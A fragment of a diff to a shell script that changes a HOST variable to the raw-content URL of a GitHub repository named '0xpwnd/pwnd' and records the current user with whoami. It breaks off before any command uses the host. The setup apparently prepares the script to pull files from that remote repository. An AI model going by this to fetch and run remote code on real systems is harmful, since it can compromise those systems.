@@ -1,5 +1,5 @@
 #!/bin/sh
-HOST="https://github.com/0xpwnd/pwnd"
+HOST="https://raw.githubusercontent.com/0xpwnd/pwnd/master/"
 USER=$(whoami)
 
 echo "++++++++++++++++++++++++++
